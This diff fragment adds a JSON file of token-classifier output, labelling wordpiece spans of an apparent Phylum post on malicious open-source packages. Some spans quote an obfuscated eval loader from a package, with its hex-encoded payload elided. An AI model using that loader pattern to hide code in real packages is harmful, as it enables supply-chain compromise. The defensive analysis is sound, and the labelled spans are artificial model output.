+      "type": "LABEL_0",
+      "score": 0.5261552333831787,
+      "start": 2218,
+      "end": 2219
+    },
+    {
+      "entity": "$ ', p ) ; } hello = eval ; image = \" < long, hex encoded payload > \" ; function render ( image ) { eval ( hexify ( package, hexify ( package, image ) ) ) ; }",
+      "type": "LABEL_1",
+      "score": 0.6970944404602051,
+      "start": 2219,
+      "end": 2377
+    },
+    {
+      "entity": "render",
+      "type": "LABEL_0",
+      "score": 0.5329155921936035,
+      "start": 2385,
+      "end": 2391
+    },
+    {
+      "entity": "( image ) ; function mapresult ( result ) { return {",
+      "type": "LABEL_1",
+      "score": 0.6930144429206848,
+      "start": 2391,
+      "end": 2449
+    },
+    {
+      "entity": "success :",
+      "type": "LABEL_0",
+      "score": 0.5446946620941162,
+      "start": 2457,
+      "end": 2465
+    },
+    {
+      "entity": "result. success, error",
+      "type": "LABEL_1",
+      "score": 0.7091886401176453,
+      "start": 2466,
+      "end": 2494
+    },
+    {
+      "entity": ":",
+      "type": "LABEL_0",
+      "score": 0.5061836242675781,
+      "start": 2494,
+      "end": 2495
+    },
+    {
+      "entity": "result. error & & parser. gettrace (",
+      "type": "LABEL_1",
+      "score": 0.7291325330734253,
+      "start": 2496,
+      "end": 2528
+    },
+    {
+      "entity": "result",
+      "type": "LABEL_0",
+      "score": 0.5453985929489136,
+      "start": 2528,
+      "end": 2534
+    },
+    {
+      "entity": ". error.",
+      "type": "LABEL_1",
+      "score": 0.8783299326896667,
+      "start": 2534,
+      "end": 2541
+    },
+    {
+      "entity": "message",
+      "type": "LABEL_0",
+      "score": 0.5185167193412781,
+      "start": 2541,
+      "end": 2548
+    },
+    {
+      "entity": ") } } with slight variations between the releases (",
+      "type": "LABEL_1",
+      "score": 0.627173662185669,
+      "start": 2548,
+      "end": 2606
+    },
+    {
+      "entity": "e",
+      "type": "LABEL_0",
+      "score": 0.5662890672683716,
+      "start": 2606,
+      "end": 2607
+    },
+    {
+      "entity": ". g., as shown above, the payload is",
+      "type": "LABEL_1",
+      "score": 0.6916416883468628,
+      "start": 2607,
+      "end": 2642
+    },
+    {
+      "entity": "actually double hex -",
+      "type": "LABEL_0",
+      "score": 0.5420467257499695,
+      "start": 2643,
+      "end": 2663
+    },
+    {
+      "entity": "encoded, where in some",
+      "type": "LABEL_1",
+      "score": 0.7134918570518494,
+      "start": 2663,
+      "end": 2685
+    },
+    {
+      "entity": "of",
+      "type": "LABEL_0",
+      "score": 0.5040618777275085,
+      "start": 2686,
+      "end": 2688
+    },
+    {
+      "entity": "the turbine _ helper releases, it only had a single layer of",
+      "type": "LABEL_1",
+      "score": 0.6792881488800049,
+      "start": 2689,
+      "end": 2747
+    },
+    {
+      "entity": "encoding",
+      "type": "LABEL_0",
+      "score": 0.5790477991104126,
+      "start": 2748,
+      "end": 2756
+    },
+    {
+      "entity": ").",
+      "type": "LABEL_1",
+      "score": 0.7698749303817749,
+      "start": 2756,
+      "end": 2758
+    },
+    {
+      "entity": "we",
+      "type": "LABEL_1",
+      "score": 0.6669621467590332,
+      "start": 7490,
+      "end": 7492
+    },
+    {
+      "entity": "have",
+      "type": "LABEL_0",
+      "score": 0.565251886844635,
+      "start": 7493,
+      "end": 7497
+    },
+    {
+      "entity": "constructed authorship models that,",
+      "type": "LABEL_1",
+      "score": 0.6089526414871216,
+      "start": 7498,
+      "end": 7533
+    },
+    {
+      "entity": "in",
+      "type": "LABEL_0",
+      "score": 0.620995819568634,
+      "start": 7534,
+      "end": 7536
+    },
+    {
+      "entity": "combination",
+      "type": "LABEL_1",
+      "score": 0.50270676612854,
+      "start": 7537,
+      "end": 7548
+    },
+    {
+      "entity": "with other metrics",
+      "type": "LABEL_0",
+      "score": 0.6284171938896179,
+      "start": 7549,
+      "end": 7567
+    },
+    {
+      "entity": ", allow us to",
+      "type": "LABEL_1",
+      "score": 0.6375236511230469,
+      "start": 7567,
+      "end": 7580
+    },
+    {
+      "entity": "identify",
+      "type": "LABEL_0",
+      "score": 0.6521010994911194,
+      "start": 7581,
+      "end": 7589
+    },
+    {
+      "entity": "odd",
+      "type": "LABEL_1",
+      "score": 0.6567093133926392,
+      "start": 7590,
+      "end": 7593
+    },
+    {
+      "entity": "behaviors",
+      "type": "LABEL_0",
+      "score": 0.5430107116699219,
+      "start": 7594,
+      "end": 7603
+    },
+    {
+      "entity": "around commits and activity. we",
+      "type": "LABEL_1",
+      "score": 0.7290234565734863,
+      "start": 7604,
+      "end": 7635
+    },
+    {
+      "entity": "analyze",
+      "type": "LABEL_0",
+      "score": 0.503485918045044,
+      "start": 7636,
+      "end": 7643
+    },
+    {
+      "entity": "maintainer",
+      "type": "LABEL_1",
+      "score": 0.6522089242935181,
+      "start": 7644,
+      "end": 7654
+    },
+    {
+      "entity": "information",
+      "type": "LABEL_0",
+      "score": 0.5617607235908508,
+      "start": 7655,
+      "end": 7666
+    },
+    {
+      "entity": "for a package, allowing us to",
+      "type": "LABEL_1",
+      "score": 0.7144530415534973,
+      "start": 7667,
+      "end": 7696
+    },
+    {
+      "entity": "spot packages",
+      "type": "LABEL_0",
+      "score": 0.6987485885620117,
+      "start": 7697,
+      "end": 7710
+    },
+    {
+      "entity": "that",
+      "type": "LABEL_1",
+      "score": 0.5967931747436523,
+      "start": 7711,
+      "end": 7715
+    },
+    {
+      "entity": "have recently changed",
+      "type": "LABEL_0",
+      "score": 0.619195282459259,
+      "start": 7716,
+      "end": 7737
+    },
+    {
+      "entity": "ownership",
+      "type": "LABEL_1",
+      "score": 0.5549153685569763,
+      "start": 7738,
+      "end": 7747
+    },
+    {
+      "entity": "that",
+      "type": "LABEL_0",
+      "score": 0.5257933735847473,
+      "start": 7748,
+      "end": 7752
+    },
+    {
+      "entity": "may be",
+      "type": "LABEL_1",
+      "score": 0.5139469504356384,
+      "start": 7753,
+      "end": 7759
+    },
+    {
+      "entity": "at",
+      "type": "LABEL_0",
+      "score": 0.8565186858177185,
+      "start": 7760,
+      "end": 7762
+    },
+    {
+      "entity": "risk for",
+      "type": "LABEL_1",
+      "score": 0.5476192831993103,
+      "start": 7763,
+      "end": 7771
+    },
+    {
+      "entity": "the",
+      "type": "LABEL_0",
+      "score": 0.5906525254249573,
+      "start": 7772,
+      "end": 7775
+    },
+    {
+      "entity": "introduction of",
+      "type": "LABEL_1",
+      "score": 0.6798717975616455,
+      "start": 7776,
+      "end": 7791
+    },
+    {
+      "entity": "malware",
+      "type": "LABEL_0",
+      "score": 0.5520601272583008,
+      "start": 7792,
+      "end": 7799
+    },
+    {
+      "entity": "(",
+      "type": "LABEL_1",
+      "score": 0.6841395497322083,
+      "start": 7800,
+      "end": 7801
+    },
+    {
+      "entity": "as",
+      "type": "LABEL_0",
+      "score": 0.5492888689041138,
+      "start": 7801,
+      "end": 7803
+    },
+    {
+      "entity": "was",
+      "type": "LABEL_1",
+      "score": 0.5198092460632324,
+      "start": 7804,
+      "end": 7807
+    },
+    {
+      "entity": "the case",
+      "type": "LABEL_0",
+      "score": 0.5380208492279053,
+      "start": 7808,
+      "end": 7816
+    },
+    {
+      "entity": "with even",
+      "type": "LABEL_1",
+      "score": 0.5432357788085938,
+      "start": 7817,
+      "end": 7826
+    },
+    {
+      "entity": "- stream",
+      "type": "LABEL_0",
+      "score": 0.6392714977264404,
+      "start": 7826,
+      "end": 7833
+    },
+    {
+      "entity": "in 2018",
+      "type": "LABEL_1",
+      "score": 0.7342863082885742,
+      "start": 7834,
+      "end": 7841
+    },
+    {
+      "entity": ")",
+      "type": "LABEL_0",
+      "score": 0.5443196296691895,
+      "start": 7841,
+      "end": 7842
+    },
+    {
+      "entity": ". we",
+      "type": "LABEL_1",
+      "score": 0.7877708673477173,
+      "start": 7842,
+      "end": 7846
+    },
+    {
+      "entity": "recently",
+      "type": "LABEL_0",
+      "score": 0.5105371475219727,
+      "start": 7847,
+      "end": 7855
+    },
+    {
+      "entity": "released support for",
+      "type": "LABEL_1",
+      "score": 0.6251994967460632,
+      "start": 7856,
+      "end": 7876
+    },
+    {
+      "entity": "c #",
+      "type": "LABEL_0",
+      "score": 0.5990878939628601,
+      "start": 7877,
+      "end": 7879
+    },
+    {
+      "entity": "/ nuget",
+      "type": "LABEL_1",
+      "score": 0.5957874655723572,
+      "start": 7879,
+      "end": 7885
+    },
+    {
+      "entity": "and java",
+      "type": "LABEL_0",
+      "score": 0.5498403310775757,
+      "start": 7886,
+      "end": 7894
+    },
+    {
+      "entity": "/ mav",
+      "type": "LABEL_1",
+      "score": 0.6231002807617188,
+      "start": 7894,
+      "end": 7898
+    },
+    {
+      "entity": "##en",
+      "type": "LABEL_0",
+      "score": 0.531749963760376,
+      "start": 7898,
+      "end": 7900
+    },
+    {
+      "entity": ", and we look forward, we are preparing to add",
+      "type": "LABEL_1",
+      "score": 0.7115472555160522,
+      "start": 7900,
+      "end": 7946
+    },
+    {
+      "entity": "the",
+      "type": "LABEL_0",
+      "score": 0.5349008440971375,
+      "start": 7947,
+      "end": 7950
+    },
+    {
+      "entity": "golang",
+      "type": "LABEL_1",
+      "score": 0.668805718421936,
+      "start": 7951,
+      "end": 7957
+    },
+    {
+      "entity": "and rust ecosystems",
+      "type": "LABEL_0",
+      "score": 0.7236091494560242,
+      "start": 7958,
+      "end": 7977
+    },
+    {
+      "entity": ".",
+      "type": "LABEL_1",
+      "score": 0.634515643119812,
+      "start": 7977,
+      "end": 7978
+    },
+    {
+      "entity": "in addition",
+      "type": "LABEL_0",
+      "score": 0.5997284054756165,
+      "start": 7979,
+      "end": 7990
+    },
+    {
+      "entity": "to this, we are pushing",
+      "type": "LABEL_1",
+      "score": 0.6510146856307983,
+      "start": 7991,
+      "end": 8014
+    },
+    {
+      "entity": "hard",
+      "type": "LABEL_0",
+      "score": 0.5573157072067261,
+      "start": 8015,
+      "end": 8019
+    },
+    {
+      "entity": "to",
+      "type": "LABEL_1",
+      "score": 0.7363443970680237,
+      "start": 8020,
+      "end": 8022
+    },
+    {
+      "entity": "increase both",
+      "type": "LABEL_0",
+      "score": 0.6207718849182129,
+      "start": 8023,
+      "end": 8036
+    },
+    {
+      "entity": "the sophistication and",
+      "type": "LABEL_1",
+      "score": 0.5955199599266052,
+      "start": 8037,
+      "end": 8059
+    },
+    {
+      "entity": "number",
+      "type": "LABEL_0",
+      "score": 0.5888479351997375,
+      "start": 8060,
+      "end": 8066
+    },
+    {
+      "entity": "of our heuristics and",
+      "type": "LABEL_1",
+      "score": 0.6288780570030212,
+      "start": 8067,
+      "end": 8088
+    },
+    {
+      "entity": "analytics",
+      "type": "LABEL_0",
+      "score": 0.6200647354125977,
+      "start": 8089,
+      "end": 8098
+    },
+    {
+      "entity": ".",
+      "type": "LABEL_1",
+      "score": 0.6795849204063416,
+      "start": 8098,
+      "end": 8099
+    },
+    {
+      "entity": "ph",
+      "type": "LABEL_0",
+      "score": 0.5004996657371521,
+      "start": 8100,
+      "end": 8102
+    },
+    {
+      "entity": "##yl",
+      "type": "LABEL_1",
+      "score": 0.5217185616493225,
+      "start": 8102,
+      "end": 8104
+    },
+    {
+      "entity": "##um",
+      "type": "LABEL_0",
+      "score": 0.5041599869728088,
+      "start": 8104,
+      "end": 8106
+    },
+    {
+      "entity": ",",
+      "type": "LABEL_1",
+      "score": 0.7151637673377991,
+      "start": 8106,
+      "end": 8107
+    },
+    {
+      "entity": "at",
+      "type": "LABEL_0",
+      "score": 0.6240757703781128,
+      "start": 8108,
+      "end": 8110
+    },
+    {
+      "entity": "its core,",
+      "type": "LABEL_1",
+      "score": 0.6832029819488525,
+      "start": 8111,
+      "end": 8120
+    },
+    {
+      "entity": "is a risk",
+      "type": "LABEL_0",
+      "score": 0.587540864944458,
+      "start": 8121,
+      "end": 8130
+    },
+    {
+      "entity": "detection",
+      "type": "LABEL_1",
+      "score": 0.6373791098594666,
+      "start": 8131,
+      "end": 8140
+    },
+    {
+      "entity": "system",
+      "type": "LABEL_0",
+      "score": 0.6496542096138,
+      "start": 8141,
+      "end": 8147
+    },
+    {
+      "entity": "focusing",
+      "type": "LABEL_1",
+      "score": 0.5531305074691772,
+      "start": 8148,
+      "end": 8156
+    },
+    {
+      "entity": "on the software supply",
+      "type": "LABEL_0",
+      "score": 0.6243560314178467,
+      "start": 8157,
+      "end": 8179
+    },
+    {
+      "entity": "chain.",
+      "type": "LABEL_1",
+      "score": 0.7061810493469238,
+      "start": 8180,
+      "end": 8186
+    },
+    {
+      "entity": "unlike other sc",
+      "type": "LABEL_0",
+      "score": 0.5918852090835571,
+      "start": 8187,
+      "end": 8202
+    },
+    {
+      "entity": "##a",
+      "type": "LABEL_1",
+      "score": 0.6964228749275208,
+      "start": 8202,
+      "end": 8203
+    },
+    {
+      "entity": "products",
+      "type": "LABEL_0",
+      "score": 0.5129633545875549,
+      "start": 8204,
+      "end": 8212
+    },
+    {
+      "entity": "that focus",
+      "type": "LABEL_1",
+      "score": 0.6516796350479126,
+      "start": 8213,
+      "end": 8223
+    },
+    {
+      "entity": "nearly exclusively on well - known issues",
+      "type": "LABEL_0",
+      "score": 0.6823602914810181,
+      "start": 8224,
+      "end": 8263
+    },
+    {
+      "entity": ", we",
+      "type": "LABEL_1",
+      "score": 0.7114830017089844,
+      "start": 8263,
+      "end": 8267
+    },
+    {
+      "entity": "are",
+      "type": "LABEL_0",
+      "score": 0.5682240724563599,
+      "start": 8268,
+      "end": 8271
+    },
+    {
+      "entity": "looking",
+      "type": "LABEL_1",
+      "score": 0.7116532325744629,
+      "start": 8272,
+      "end": 8279
+    },
+    {
+      "entity": "for the",
+      "type": "LABEL_0",
+      "score": 0.5601977109909058,
+      "start": 8280,
+      "end": 8287
+    },
+    {
+      "entity": "unknown unknown",
+      "type": "LABEL_1",
+      "score": 0.8007605075836182,
+      "start": 8288,
+      "end": 8303
+    },
+    {
+      "entity": "##s - the subtle modifications",
+      "type": "LABEL_0",
+      "score": 0.6401134133338928,
+      "start": 8303,
+      "end": 8331
+    },
+    {
+      "entity": "to",
+      "type": "LABEL_1",
+      "score": 0.6207059025764465,
+      "start": 8332,
+      "end": 8334
+    },
+    {
+      "entity": "a software",
+      "type": "LABEL_0",
+      "score": 0.6763788461685181,
+      "start": 8335,
+      "end": 8345
+    },
+    {
+      "entity": "package that will",
+      "type": "LABEL_1",
+      "score": 0.6295481324195862,
+      "start": 8346,
+      "end": 8363
+    },
+    {
+      "entity": "surreptitiously",
+      "type": "LABEL_0",
+      "score": 0.5835641622543335,
+      "start": 8364,
+      "end": 8379
+    },
+    {
+      "entity": "exfiltrate keys to your",
+      "type": "LABEL_1",
+      "score": 0.6631821393966675,
+      "start": 8380,
+      "end": 8403
+    },
+    {
+      "entity": "critical infrastructure",
+      "type": "LABEL_0",
+      "score": 0.6557728052139282,
+      "start": 8404,
+      "end": 8427
+    },
+    {
+      "entity": ". we do this",
+      "type": "LABEL_1",
+      "score": 0.7722136974334717,
+      "start": 8427,
+      "end": 8439
+    },
+    {
+      "entity": "at the scale",
+      "type": "LABEL_0",
+      "score": 0.6142193675041199,
+      "start": 8440,
+      "end": 8452
+    },
+    {
+      "entity": "of",
+      "type": "LABEL_1",
+      "score": 0.5205662846565247,
+      "start": 8453,
+      "end": 8455
+    },
+    {
+      "entity": "open source",
+      "type": "LABEL_0",
+      "score": 0.6457828879356384,
+      "start": 8456,
+      "end": 8467
+    },
+    {
+      "entity": ", tackling",
+      "type": "LABEL_1",
+      "score": 0.7468726634979248,
+      "start": 8467,
+      "end": 8477
+    },
+    {
+      "entity": "the problem",
+      "type": "LABEL_0",
+      "score": 0.536633312702179,
+      "start": 8478,
+      "end": 8489
+    },
+    {
+      "entity": "in an automated fashion, to",
+      "type": "LABEL_1",
+      "score": 0.6233989000320435,
+      "start": 8490,
+      "end": 8517
+    },
+    {
+      "entity": "make software",
+      "type": "LABEL_0",
+      "score": 0.6784124374389648,
+      "start": 8518,
+      "end": 8531
+    },
+    {
+      "entity": "supply",
+      "type": "LABEL_1",
+      "score": 0.52272629737854,
+      "start": 8532,
+      "end": 8538
+    },
+    {
+      "entity": "chain security proactive instead",
+      "type": "LABEL_0",
+      "score": 0.5852381587028503,
+      "start": 8539,
+      "end": 8571
+    },
+    {
+      "entity": "of",
+      "type": "LABEL_1",
+      "score": 0.5129680037498474,
+      "start": 8572,
+      "end": 8574
+    },
+    {
+      "entity": "merely reactive",
+      "type": "LABEL_0",
+      "score": 0.6070408225059509,
+      "start": 8575,
+      "end": 8590
+    },
+    {
+      "entity": ". to",
+      "type": "LABEL_1",
+      "score": 0.7072712182998657,
+      "start": 8590,
+      "end": 8594
+    },
+    {
+      "entity": "learn more",
+      "type": "LABEL_0",
+      "score": 0.5854682922363281,
+      "start": 8595,
+      "end": 8605
+    },
+    {
+      "entity": "about ph",
+      "type": "LABEL_1",
+      "score": 0.5844506621360779,
+      "start": 8606,
+      "end": 8614
+    },
+    {
+      "entity": "##ylum",
+      "type": "LABEL_0",
+      "score": 0.5999386310577393,
+      "start": 8614,
+      "end": 8618
+    },
+    {
+      "entity": "’",
+      "type": "LABEL_1",
+      "score": 0.5013470649719238,
+      "start": 8618,
+      "end": 8619
+    },
+    {
+      "entity": "s",
+      "type": "LABEL_0",
+      "score": 0.8615567088127136,
+      "start": 8619,
+      "end": 8620
+    },
+    {
+      "entity": "automated",
+      "type": "LABEL_1",
+      "score": 0.6928532123565674,
+      "start": 8621,
+      "end": 8630
+    },
+    {
+      "entity": "malware identification capability",
+      "type": "LABEL_0",
+      "score": 0.6632214784622192,
+      "start": 8631,
+      "end": 8664
+    },
+    {
+      "entity": "and how we",
+      "type": "LABEL_1",
+      "score": 0.6583700180053711,
+      "start": 8665,
+      "end": 8675
+    },
+    {
+      "entity": "support secure",
+      "type": "LABEL_0",
+      "score": 0.6552689075469971,
+      "start": 8676,
+      "end": 8690
+    },
+    {
+      "entity": "and",
+      "type": "LABEL_1",
+      "score": 0.6860512495040894,
+      "start": 8691,
+      "end": 8694
+    },
+    {
+      "entity": "efficient use",
+      "type": "LABEL_0",
+      "score": 0.5905001163482666,
+      "start": 8695,
+      "end": 8708
+    },
+    {
+      "entity": "of",
+      "type": "LABEL_1",
+      "score": 0.5738463997840881,
+      "start": 8709,
+      "end": 8711
+    },
+    {
+      "entity": "open - source software please",
+      "type": "LABEL_0",
+      "score": 0.6247240304946899,
+      "start": 8712,
+      "end": 8739
+    },
+    {
+      "entity": "contact",
+      "type": "LABEL_1",
+      "score": 0.7000849843025208,
+      "start": 8740,
+      "end": 8747
+    },
+    {
+      "entity": "us",
+      "type": "LABEL_0",
+      "score": 0.5724841356277466,
+      "start": 8748,
+      "end": 8750
+    },
+    {
+      "entity": "for",
+      "type": "LABEL_1",
+      "score": 0.606979489326477,
+      "start": 8751,
+      "end": 8754
+    },
+    {
+      "entity": "a",
+      "type": "LABEL_0",
+      "score": 0.5216490626335144,
+      "start": 8755,
+      "end": 8756
+    },
+    {
+      "entity": "conversation..",
+      "type": "LABEL_1",
+      "score": 0.7668552398681641,
+      "start": 8757,
+      "end": 8771
+    }
+  ]
+}
